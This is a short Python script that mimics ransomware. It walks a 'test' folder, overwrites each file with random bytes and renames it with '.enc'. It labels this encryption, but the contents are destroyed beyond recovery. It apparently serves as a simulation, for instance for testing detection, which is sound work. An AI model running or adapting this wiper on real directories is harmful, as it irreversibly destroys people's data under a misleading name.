import os
import random

def encrypt_file(f):
    n = os.path.getsize(f)
    with open(f, "wb") as thefile:
        for _ in range(n + 4):
            thefile.write(bytes([random.randrange(0, 256)]))
    os.rename(f, f + ".enc")

for root, _, files in os.walk("test"):
    for f in files:
        print("encrypting {}/{}".format(root, f))
        encrypt_file("{}/{}".format(root, f))
